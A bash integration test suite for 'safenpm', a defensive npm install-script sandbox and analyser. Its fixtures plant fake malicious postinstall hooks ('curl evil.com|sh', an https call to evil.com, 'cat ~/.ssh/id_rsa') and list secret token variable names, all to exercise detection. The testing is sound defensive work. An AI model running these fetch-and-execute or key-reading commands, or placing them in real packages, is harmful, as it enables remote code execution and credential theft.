#!/bin/bash
# safenpm integration test suite — v0.5.0
# Usage: cd safenpm && npm run build && bash test/run-tests.sh

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
TEST_DIR=$(mktemp -d)
PASS=0
FAIL=0

green() { printf "\033[32m%s\033[0m\n" "$1"; }
red()   { printf "\033[31m%s\033[0m\n" "$1"; }
dim()   { printf "\033[2m%s\033[0m\n" "$1"; }
bold()  { printf "\033[1m%s\033[0m\n" "$1"; }

assert_eq() {
  if [ "$1" = "$2" ]; then PASS=$((PASS + 1)); green "  ✓ $3"
  else FAIL=$((FAIL + 1)); red "  ✕ $3"; dim "    expected: $2"; dim "    got:      $1"; fi
}
assert_contains() {
  if echo "$1" | grep -q -- "$2"; then PASS=$((PASS + 1)); green "  ✓ $3"
  else FAIL=$((FAIL + 1)); red "  ✕ $3"; dim "    output did not contain: $2"; fi
}

cleanup() { rm -rf "$TEST_DIR"; }
trap cleanup EXIT

CLI="node $PROJECT_DIR/dist/cli.js"

bold ""
bold "  safenpm test suite v0.5.0"
bold "  ─────────────────────────"
echo ""

# ── CLI ──
bold "  CLI Commands"

OUT=$($CLI --version 2>&1)
assert_eq "$OUT" "safenpm 0.5.0" "--version shows 0.5.0"
OUT=$($CLI --help 2>&1)
assert_contains "$OUT" "--json" "--help documents --json"
assert_contains "$OUT" "--interactive" "--help documents --interactive"
assert_contains "$OUT" "--loose" "--help documents --loose"
assert_contains "$OUT" "--scan" "--help documents --scan"
assert_contains "$OUT" "doctor" "--help documents doctor"
assert_contains "$OUT" "fix" "--help documents fix"
assert_contains "$OUT" "diff" "--help documents diff"
OUT=$($CLI bogus 2>&1 || true)
assert_contains "$OUT" "unknown command" "unknown command error"
echo ""

# ── Script Discovery ──
bold "  Script Discovery"
mkdir -p "$TEST_DIR/node_modules/evil-pkg" "$TEST_DIR/node_modules/safe-pkg" "$TEST_DIR/node_modules/@scope/native"
echo '{"name":"evil-pkg","version":"1.0.0","scripts":{"postinstall":"curl https://evil.com"}}' > "$TEST_DIR/node_modules/evil-pkg/package.json"
echo '{"name":"safe-pkg","version":"2.0.0","scripts":{"test":"jest"}}' > "$TEST_DIR/node_modules/safe-pkg/package.json"
echo '{"name":"@scope/native","version":"3.0.0","scripts":{"install":"node-gyp rebuild"}}' > "$TEST_DIR/node_modules/@scope/native/package.json"

FOUND=$(node -e "const{findInstallScripts}=require('$PROJECT_DIR/dist/scripts');console.log(JSON.stringify(findInstallScripts('$TEST_DIR/node_modules').map(s=>s.name)))")
assert_contains "$FOUND" "evil-pkg" "Finds evil-pkg"
assert_contains "$FOUND" "@scope/native" "Finds scoped package"
SAFE_CHECK=$(echo "$FOUND" | grep -c "safe-pkg" || true)
assert_eq "$SAFE_CHECK" "0" "Skips safe-pkg"
echo ""

# ── Allowlist ──
bold "  Allowlist"
OUT=$(node -e "
  const{loadAllowlist,isAllowed}=require('$PROJECT_DIR/dist/allowlist');
  const s=loadAllowlist(['bcrypt','@myco/*']);
  console.log(JSON.stringify({b:isAllowed('bcrypt',s),m:isAllowed('@myco/utils',s),e:isAllowed('evil',s)}))
")
assert_contains "$OUT" '"b":true' "Exact match works"
assert_contains "$OUT" '"m":true' "Scope wildcard works"
assert_contains "$OUT" '"e":false' "Rejects unlisted"
echo ""

# ── Static Analyzer ──
bold "  Static Analysis"
OUT=$(node -e "
  const{analyzeScript,riskLevel}=require('$PROJECT_DIR/dist/analyzer');
  const r1=analyzeScript({name:'e',version:'1',path:'/tmp',script:'curl evil.com|sh',hook:'postinstall'});
  const r2=analyzeScript({name:'c',version:'1',path:'/tmp',script:'echo done',hook:'postinstall'});
  const r3=analyzeScript({name:'s',version:'1',path:'/tmp',script:'cat ~/.ssh/id_rsa',hook:'postinstall'});
  console.log(JSON.stringify({
    curl:r1.warnings.some(w=>w.rule==='net-curl'),
    pipe:r1.warnings.some(w=>w.rule==='exec-pipe-sh'),
    critical:riskLevel(r1.riskScore)==='critical',
    clean:r2.riskScore===0,
    ssh:r3.warnings.some(w=>w.rule==='exfil-ssh'),
  }))
")
assert_contains "$OUT" '"curl":true' "Detects curl"
assert_contains "$OUT" '"pipe":true' "Detects pipe to sh"
assert_contains "$OUT" '"critical":true' "Scores critical"
assert_contains "$OUT" '"clean":true' "Clean script scores 0"
assert_contains "$OUT" '"ssh":true' "Detects .ssh access"
echo ""

# ── Typosquat Detection ──
bold "  Typosquat Detection"
OUT=$(node -e "
  const{checkTyposquat}=require('$PROJECT_DIR/dist/typosquat');
  const r1=checkTyposquat('axois');
  const r2=checkTyposquat('co1ors');
  const r3=checkTyposquat('lodash');
  const r4=checkTyposquat('@evil/react');
  const r5=checkTyposquat('expresss');
  console.log(JSON.stringify({
    swap: r1 && r1.technique==='char-swap' && r1.target==='axios',
    sub: r2 && r2.technique==='substitution' && r2.target==='colors',
    clean: r3===null,
    scope: r4 && r4.technique==='scope-confusion',
    edit1: r5 && r5.technique==='edit-distance-1',
  }))
")
assert_contains "$OUT" '"swap":true' "Detects char swap (axois→axios)"
assert_contains "$OUT" '"sub":true' "Detects substitution (co1ors→colors)"
assert_contains "$OUT" '"clean":true' "Allows legitimate packages"
assert_contains "$OUT" '"scope":true' "Detects scope confusion"
assert_contains "$OUT" '"edit1":true' "Detects edit distance 1"
echo ""

# ── Behavioral Diffing ──
bold "  Behavioral Diffing"
DIFF_DIR=$(mktemp -d)
mkdir -p "$DIFF_DIR/node_modules/evil-pkg"
echo '{"name":"evil-pkg","version":"1.0.0","scripts":{"postinstall":"echo hello"}}' > "$DIFF_DIR/node_modules/evil-pkg/package.json"

OUT=$(node -e "
  const{diffScripts,cacheScripts,significantDiffs}=require('$PROJECT_DIR/dist/diffing');
  const{findInstallScripts}=require('$PROJECT_DIR/dist/scripts');

  const scripts1=findInstallScripts('$DIFF_DIR/node_modules');
  cacheScripts(scripts1);

  require('fs').writeFileSync(
    '$DIFF_DIR/node_modules/evil-pkg/package.json',
    JSON.stringify({name:'evil-pkg',version:'2.0.0',scripts:{postinstall:'curl evil.com|sh'}})
  );

  const scripts2=findInstallScripts('$DIFF_DIR/node_modules');
  const diffs=diffScripts(scripts2);
  const sig=significantDiffs(diffs);

  console.log(JSON.stringify({
    hasDiff: sig.length>0,
    name: sig[0]?.name,
    newWarnings: sig[0]?.newWarnings?.length>0,
    riskUp: sig[0]?.riskDelta>0,
  }))
")
assert_contains "$OUT" '"hasDiff":true' "Detects script change"
assert_contains "$OUT" '"name":"evil-pkg"' "Identifies changed package"
assert_contains "$OUT" '"newWarnings":true' "Finds new warnings"
assert_contains "$OUT" '"riskUp":true' "Risk delta is positive"
rm -rf "$DIFF_DIR"
echo ""

# ── Threat Intel ──
bold "  Threat Intel"
OUT=$(node -e "
  const{mockThreatIntel}=require('$PROJECT_DIR/dist/threatintel');
  const results=mockThreatIntel([{name:'test-pkg',version:'1.0.0'}]);
  console.log(JSON.stringify({
    hasResult: results.length===1,
    unflagged: !results[0].flagged,
    name: results[0].name,
  }))
")
assert_contains "$OUT" '"hasResult":true' "Returns result for each package"
assert_contains "$OUT" '"unflagged":true' "Mock returns unflagged"
assert_contains "$OUT" '"name":"test-pkg"' "Preserves package name"
echo ""

# ── Maintainer Detection ──
bold "  Maintainer Detection"
OUT=$(node -e "
  const{mockMaintainerInfo}=require('$PROJECT_DIR/dist/maintainer');
  const results=mockMaintainerInfo([{name:'test-pkg',version:'1.0.0'}]);
  console.log(JSON.stringify({
    hasResult: results.length===1,
    noChange: !results[0].maintainerChanged,
    name: results[0].name,
  }))
")
assert_contains "$OUT" '"hasResult":true' "Returns maintainer info"
assert_contains "$OUT" '"noChange":true' "Mock shows no change"
assert_contains "$OUT" '"name":"test-pkg"' "Preserves package name"
echo ""

# ── Lockfile Audit ──
bold "  Lockfile Audit"
LOCK_DIR=$(mktemp -d)

OUT=$(node -e "
  const{auditLockfile}=require('$PROJECT_DIR/dist/lockfile');
  const r=auditLockfile('$LOCK_DIR');
  console.log(JSON.stringify({exists:r.exists,hasIssue:r.issues.length>0}))
")
assert_contains "$OUT" '"exists":false' "Detects missing lockfile"
assert_contains "$OUT" '"hasIssue":true' "Reports no-lockfile issue"

echo '{"lockfileVersion":3,"packages":{"":{},"node_modules/evil":{"version":"1.0.0","resolved":"git+https://github.com/evil/pkg.git#abc","integrity":"sha512-abc123"}}}' > "$LOCK_DIR/package-lock.json"
OUT=$(node -e "
  const{auditLockfile,significantLockfileIssues}=require('$PROJECT_DIR/dist/lockfile');
  const r=auditLockfile('$LOCK_DIR');
  const sig=significantLockfileIssues(r);
  console.log(JSON.stringify({exists:r.exists,format:r.format,hasGitDep:sig.some(i=>i.type==='git-dependency')}))
")
assert_contains "$OUT" '"exists":true' "Finds lockfile"
assert_contains "$OUT" '"format":"v3"' "Detects v3 format"
assert_contains "$OUT" '"hasGitDep":true' "Flags git dependency"
rm -rf "$LOCK_DIR"
echo ""

# ── Reputation Scoring ──
bold "  Reputation Scoring"
REP_DIR=$(mktemp -d)
mkdir -p "$REP_DIR/node_modules/good-pkg" "$REP_DIR/node_modules/bad-pkg"
echo '{"name":"good-pkg","version":"2.1.0","description":"A well-maintained package","license":"MIT","repository":{"type":"git","url":"https://github.com/org/good-pkg"},"maintainers":[{"name":"a"},{"name":"b"},{"name":"c"}]}' > "$REP_DIR/node_modules/good-pkg/package.json"
echo '{"name":"bad-pkg","version":"0.0.1","scripts":{"postinstall":"curl evil.com"}}' > "$REP_DIR/node_modules/bad-pkg/package.json"

OUT=$(node -e "
  const{scoreReputationFromNodeModules}=require('$PROJECT_DIR/dist/reputation');
  const s=scoreReputationFromNodeModules('$REP_DIR/node_modules');
  const good=s.riskiest.find(r=>r.name==='good-pkg');
  const bad=s.riskiest.find(r=>r.name==='bad-pkg');
  console.log(JSON.stringify({
    total:s.totalPackages,
    hasScore:s.overallScore>=0,
    goodHigher: !good || !bad || good.score > bad.score,
  }))
")
assert_contains "$OUT" '"total":2' "Scores both packages"
assert_contains "$OUT" '"hasScore":true' "Computes overall score"
assert_contains "$OUT" '"goodHigher":true' "Good pkg scores higher than bad"
rm -rf "$REP_DIR"
echo ""

# ── Auto-fix ──
bold "  Auto-fix"
OUT=$(node -e "
  const{generateFixes,previewFixes}=require('$PROJECT_DIR/dist/autofix');
  const typosquats=[{suspect:'axois',target:'axios',distance:1,technique:'char-swap',confidence:'high'}];
  const blocked=[{pkg:{name:'evil-pkg',version:'1.0.0',path:'/tmp',script:'curl evil.com',hook:'postinstall'},blocked:true,skipped:false,reason:'network',output:'',durationMs:10}];
  const fixes=generateFixes(typosquats,blocked);
  const preview=previewFixes(fixes);
  console.log(JSON.stringify({
    count:fixes.length,
    hasReplace:fixes.some(f=>f.type==='replace-typosquat'),
    hasRemove:fixes.some(f=>f.type==='remove-malicious'),
    previewLen:preview.length,
  }))
")
assert_contains "$OUT" '"count":2' "Generates 2 fix actions"
assert_contains "$OUT" '"hasReplace":true' "Has typosquat replacement"
assert_contains "$OUT" '"hasRemove":true' "Has malicious removal"
assert_contains "$OUT" '"previewLen":2' "Preview has 2 entries"
echo ""

# ── Doctor ──
bold "  Doctor"
DOC_DIR=$(mktemp -d)
echo '{"name":"test-project","version":"1.0.0","dependencies":{"lodash":"^4.0.0"}}' > "$DOC_DIR/package.json"
mkdir -p "$DOC_DIR/node_modules/lodash"
echo '{"name":"lodash","version":"4.17.21","description":"Lodash utility library","license":"MIT","repository":{"type":"git","url":"https://github.com/lodash/lodash"},"maintainers":[{"name":"a"},{"name":"b"}]}' > "$DOC_DIR/node_modules/lodash/package.json"

OUT=$(cd "$DOC_DIR" && node -e "
  const{runDoctor}=require('$PROJECT_DIR/dist/doctor');
  const r=runDoctor('$DOC_DIR');
  console.log(JSON.stringify({
    hasGrade: typeof r.grade==='string' && r.grade.length>0,
    hasScore: r.score>=0 && r.score<=100,
    hasSections: r.sections.length>0,
    sectionNames: r.sections.map(s=>s.name),
  }))
")
assert_contains "$OUT" '"hasGrade":true' "Doctor produces a grade"
assert_contains "$OUT" '"hasScore":true' "Doctor produces a score"
assert_contains "$OUT" '"hasSections":true' "Doctor has sections"
assert_contains "$OUT" "Lockfile" "Has Lockfile section"
assert_contains "$OUT" "Install Scripts" "Has Install Scripts section"
assert_contains "$OUT" "Typosquats" "Has Typosquats section"
assert_contains "$OUT" "Reputation" "Has Reputation section"
assert_contains "$OUT" "Project Hygiene" "Has Project Hygiene section"

# Doctor JSON output
DOC_JSON=$(cd "$DOC_DIR" && $CLI doctor --json 2>&1)
DOC_VALID=$(echo "$DOC_JSON" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{JSON.parse(d);console.log('valid')}catch{console.log('invalid')}})" 2>&1)
assert_eq "$DOC_VALID" "valid" "Doctor --json is valid JSON"
assert_contains "$DOC_JSON" '"grade"' "Doctor JSON has grade"
assert_contains "$DOC_JSON" '"sections"' "Doctor JSON has sections"
rm -rf "$DOC_DIR"
echo ""

# ── Package Diff ──
bold "  Package Diff"
PDIFF_DIR=$(mktemp -d)
mkdir -p "$PDIFF_DIR/node_modules/test-lib"
echo '{"name":"test-lib","version":"1.0.0","scripts":{"postinstall":"echo v1"},"dependencies":{"dep-a":"^1.0.0"}}' > "$PDIFF_DIR/node_modules/test-lib/package.json"

OUT=$(node -e "
  const{snapshotPackage,diffPackage}=require('$PROJECT_DIR/dist/pkgdiff');

  // Take snapshot
  snapshotPackage('$PDIFF_DIR/node_modules/test-lib','test-lib','1.0.0');

  // Modify package
  require('fs').writeFileSync(
    '$PDIFF_DIR/node_modules/test-lib/package.json',
    JSON.stringify({name:'test-lib',version:'2.0.0',scripts:{postinstall:'curl evil.com'},dependencies:{'dep-a':'^2.0.0','dep-b':'^1.0.0'}})
  );

  // Diff
  const d=diffPackage('$PDIFF_DIR/node_modules/test-lib','test-lib','2.0.0');
  console.log(JSON.stringify({
    isNew: d.isNew,
    prevVer: d.previousVersion,
    currVer: d.currentVersion,
    hasScriptDiff: d.scriptDiff!==null,
    scriptChanged: d.scriptDiff?.changed,
    hasDepsDiff: d.depsDiff!==null,
    addedDeps: d.depsDiff?.added?.length>0,
    changedDeps: d.depsDiff?.changed?.length>0,
  }))
")
assert_contains "$OUT" '"isNew":false' "Recognizes existing package"
assert_contains "$OUT" '"prevVer":"1.0.0"' "Tracks previous version"
assert_contains "$OUT" '"currVer":"2.0.0"' "Tracks current version"
assert_contains "$OUT" '"hasScriptDiff":true' "Detects script change"
assert_contains "$OUT" '"scriptChanged":true' "Script marked as changed"
assert_contains "$OUT" '"hasDepsDiff":true' "Detects dependency changes"
assert_contains "$OUT" '"addedDeps":true' "Finds added dependency"
assert_contains "$OUT" '"changedDeps":true' "Finds changed dependency"
rm -rf "$PDIFF_DIR"
echo ""

# ── CLI: Doctor Command ──
bold "  CLI: Doctor Command"
CLI_DOC_DIR=$(mktemp -d)
echo '{"name":"cli-test","version":"1.0.0"}' > "$CLI_DOC_DIR/package.json"
DOC_OUT=$(cd "$CLI_DOC_DIR" && $CLI doctor 2>&1)
assert_contains "$DOC_OUT" "Grade:" "Doctor command shows grade"
assert_contains "$DOC_OUT" "Lockfile" "Doctor shows Lockfile section"
rm -rf "$CLI_DOC_DIR"
echo ""

# ── CLI: Diff Command ──
bold "  CLI: Diff Command"
CLI_DIFF_DIR=$(mktemp -d)
mkdir -p "$CLI_DIFF_DIR/node_modules/lib"
echo '{"name":"lib","version":"1.0.0"}' > "$CLI_DIFF_DIR/node_modules/lib/package.json"

SNAP_OUT=$(cd "$CLI_DIFF_DIR" && $CLI diff --snapshot 2>&1)
assert_contains "$SNAP_OUT" "snapshot saved" "Diff --snapshot saves baseline"

DIFF_OUT=$(cd "$CLI_DIFF_DIR" && $CLI diff 2>&1)
assert_contains "$DIFF_OUT" "no changes\|safenpm" "Diff shows no changes or runs"
rm -rf "$CLI_DIFF_DIR"
echo ""

# ── CLI: Fix Command ──
bold "  CLI: Fix Command"
FIX_DIR=$(mktemp -d)
mkdir -p "$FIX_DIR/node_modules/lodash"
echo '{"name":"lodash","version":"4.17.21"}' > "$FIX_DIR/node_modules/lodash/package.json"
echo '{"name":"fix-test","version":"1.0.0"}' > "$FIX_DIR/package.json"

FIX_OUT=$(cd "$FIX_DIR" && $CLI fix --dry-run 2>&1)
assert_contains "$FIX_OUT" "no fixable\|fix" "Fix --dry-run runs"
rm -rf "$FIX_DIR"
echo ""

# ── JSON Output ──
bold "  JSON Output"
JSON_DIR=$(mktemp -d)
mkdir -p "$JSON_DIR/node_modules/evil-pkg"
echo '{"name":"evil-pkg","version":"1.0.0","scripts":{"postinstall":"curl evil.com"}}' > "$JSON_DIR/node_modules/evil-pkg/package.json"

JSON_OUT=$(cd "$JSON_DIR" && $CLI i --dry-run --json 2>&1)
VALID=$(echo "$JSON_OUT" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{JSON.parse(d);console.log('valid')}catch{console.log('invalid')}})" 2>&1)
assert_eq "$VALID" "valid" "JSON output is valid"
assert_contains "$JSON_OUT" '"riskScore"' "JSON has risk scores"
assert_contains "$JSON_OUT" '"warnings"' "JSON has warnings"
rm -rf "$JSON_DIR"
echo ""

# ── Dry Run with Analysis ──
bold "  Dry Run"
DRY_DIR=$(mktemp -d)
mkdir -p "$DRY_DIR/node_modules/evil-pkg"
echo '{"name":"evil-pkg","version":"1.0.0","scripts":{"postinstall":"curl evil.com | sh"}}' > "$DRY_DIR/node_modules/evil-pkg/package.json"
DRY_OUT=$(cd "$DRY_DIR" && $CLI i --dry-run 2>&1)
assert_contains "$DRY_OUT" "static analysis" "Shows analysis"
assert_contains "$DRY_OUT" "evil-pkg" "Shows package"
rm -rf "$DRY_DIR"
echo ""

# ── Scan Command ──
bold "  Scan Command"
SCAN_DIR=$(mktemp -d)
mkdir -p "$SCAN_DIR/node_modules/lodash" "$SCAN_DIR/node_modules/expresss"
echo '{"name":"lodash","version":"4.17.21","description":"Lodash utility library","license":"MIT","repository":{"type":"git","url":"https://github.com/lodash/lodash"}}' > "$SCAN_DIR/node_modules/lodash/package.json"
echo '{"name":"expresss","version":"0.0.1","scripts":{"postinstall":"curl evil.com"}}' > "$SCAN_DIR/node_modules/expresss/package.json"

SCAN_OUT=$(cd "$SCAN_DIR" && $CLI scan --json 2>&1)
SCAN_VALID=$(echo "$SCAN_OUT" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{JSON.parse(d);console.log('valid')}catch{console.log('invalid')}})" 2>&1)
assert_eq "$SCAN_VALID" "valid" "Scan JSON is valid"
assert_contains "$SCAN_OUT" "typosquats" "Scan includes typosquats"
assert_contains "$SCAN_OUT" "reputation" "Scan includes reputation"
assert_contains "$SCAN_OUT" "lockfile" "Scan includes lockfile"
rm -rf "$SCAN_DIR"
echo ""

# ── Audit ──
bold "  Audit"
AUDIT_OUT=$($CLI audit 2>&1)
assert_contains "$AUDIT_OUT" "safenpm\|audit" "Audit command runs"
echo ""

# ── Sandbox (platform-specific) ──
bold "  Sandbox Execution"

if command -v sandbox-exec &>/dev/null; then
  green "  sandbox-exec found — running macOS tests"
  echo ""

  SANDBOX_PROFILE='(version 1)(allow default)(deny network-outbound)(deny network-inbound)(deny network-bind)(deny network*)'

  OUT=$(sandbox-exec -p "$SANDBOX_PROFILE" curl -s --max-time 3 https://httpbin.org/get 2>&1 || true)
  BLOCKED=$(echo "$OUT" | grep -ci "denied\|not permitted\|operation not allowed" || true)
  if [ "$BLOCKED" -gt 0 ] || [ -z "$OUT" ]; then
    PASS=$((PASS + 1)); green "  ✓ Blocks outbound HTTP"
  else
    FAIL=$((FAIL + 1)); red "  ✕ Did NOT block curl"
  fi

  OUT=$(sandbox-exec -p "$SANDBOX_PROFILE" node -e "require('dns').resolve('google.com',(e)=>{if(e){console.log('DNS_BLOCKED');process.exit(1)}else{console.log('DNS_OK');process.exit(0)}})" 2>&1 || true)
  if echo "$OUT" | grep -q "DNS_BLOCKED\|denied\|EAI_AGAIN"; then
    PASS=$((PASS + 1)); green "  ✓ Blocks DNS"
  else
    FAIL=$((FAIL + 1)); red "  ✕ Did NOT block DNS"
  fi

  TMPFILE="$TEST_DIR/write-test.txt"
  sandbox-exec -p "$SANDBOX_PROFILE" bash -c "echo 'hello' > $TMPFILE" 2>&1
  if [ -f "$TMPFILE" ] && [ "$(cat "$TMPFILE")" = "hello" ]; then
    PASS=$((PASS + 1)); green "  ✓ Allows file writes"
  else
    FAIL=$((FAIL + 1)); red "  ✕ Blocked file writes"
  fi

  echo ""
  bold "  End-to-End with Allowlist + Analysis"

  E2E_DIR=$(mktemp -d)
  mkdir -p "$E2E_DIR/node_modules/phone-home" "$E2E_DIR/node_modules/clean-lib" "$E2E_DIR/node_modules/trusted-build"
  echo '{"name":"phone-home","version":"0.0.1","scripts":{"postinstall":"node -e \"require('"'"'https'"'"').get('"'"'https://evil.com'"'"')\""}}' > "$E2E_DIR/node_modules/phone-home/package.json"
  echo '{"name":"clean-lib","version":"1.0.0","scripts":{"install":"echo done"}}' > "$E2E_DIR/node_modules/clean-lib/package.json"
  echo '{"name":"trusted-build","version":"3.0.0","scripts":{"postinstall":"echo building..."}}' > "$E2E_DIR/node_modules/trusted-build/package.json"

  OUT=$(node -e "
    const{findInstallScripts}=require('$PROJECT_DIR/dist/scripts');
    const{runInSandbox}=require('$PROJECT_DIR/dist/sandbox');
    const{loadAllowlist,isAllowed}=require('$PROJECT_DIR/dist/allowlist');
    const{analyzeAll}=require('$PROJECT_DIR/dist/analyzer');
    const{logger}=require('$PROJECT_DIR/dist/logger');

    const allowlist=loadAllowlist(['trusted-build']);
    const scripts=findInstallScripts('$E2E_DIR/node_modules');
    const analyses=analyzeAll(scripts);

    logger.banner();
    if(analyses.some(a=>a.warnings.length>0)){
      logger.analysisHeader();
      analyses.filter(a=>a.warnings.length>0).forEach(a=>logger.analysisResult(a));
    }

    let blocked=0,skipped=0;
    for(const pkg of scripts){
      if(isAllowed(pkg.name,allowlist)){logger.skipped(pkg.name,pkg.version);skipped++;continue}
      const r=runInSandbox(pkg);
      if(r.blocked){blocked++;logger.blocked(pkg.name,pkg.version,pkg.hook,r.reason)}
      else{logger.allowed(pkg.name,pkg.version)}
    }
    logger.summary(scripts.length,blocked,skipped,analyses.reduce((s,a)=>s+a.warnings.length,0));
    console.log('RESULT:'+scripts.length+':'+blocked+':'+skipped);
  " 2>&1)

  echo "$OUT" | head -25

  RESULT_LINE=$(echo "$OUT" | grep "^RESULT:" | tail -1)
  TOTAL=$(echo "$RESULT_LINE" | cut -d: -f2)
  BLOCKED_COUNT=$(echo "$RESULT_LINE" | cut -d: -f3)
  SKIPPED_COUNT=$(echo "$RESULT_LINE" | cut -d: -f4)

  assert_eq "$TOTAL" "3" "Found 3 scripts"
  assert_eq "$SKIPPED_COUNT" "1" "1 allowlisted"
  if [ "$BLOCKED_COUNT" -ge 1 ]; then
    PASS=$((PASS + 1)); green "  ✓ Blocked phone-home"
  else
    FAIL=$((FAIL + 1)); red "  ✕ Did not block phone-home"
  fi
  assert_contains "$OUT" "allowlisted" "Shows allowlisted"
  assert_contains "$OUT" "static analysis\|risk:" "Shows analysis"

  rm -rf "$E2E_DIR"

elif command -v firejail &>/dev/null; then
  green "  firejail found — running Linux tests"
  OUT=$(firejail --net=none --quiet --noprofile -- curl -s --max-time 3 https://httpbin.org/get 2>&1 || true)
  if [ -z "$OUT" ] || echo "$OUT" | grep -qi "error\|refused"; then
    PASS=$((PASS + 1)); green "  ✓ firejail blocks HTTP"
  else
    FAIL=$((FAIL + 1)); red "  ✕ firejail did NOT block"
  fi
else
  dim "  no sandbox backend — skipping"
fi

echo ""

# ── Security ──
bold "  Security: Env Stripping"
OUT=$(node -e "
  const src=require('fs').readFileSync('$PROJECT_DIR/src/sandbox.ts','utf8');
  const r=['npm_config_authtoken','NPM_TOKEN','GITHUB_TOKEN','GH_TOKEN','GITLAB_TOKEN','AWS_SECRET_ACCESS_KEY','AWS_ACCESS_KEY_ID','AWS_SESSION_TOKEN','AZURE_CLIENT_SECRET','GOOGLE_APPLICATION_CREDENTIALS'];
  console.log(r.every(v=>src.includes(v))?'ALL':'MISSING')
")
assert_eq "$OUT" "ALL" "Strips all 10 sensitive env vars"
echo ""

# ── Summary ──
echo ""
bold "  ════════════════════════════════════════"
if [ "$FAIL" -eq 0 ]; then
  green "  All $PASS tests passed"
else
  red "  $PASS passed, $FAIL failed"
fi
bold "  ════════════════════════════════════════"
echo ""
exit $FAIL
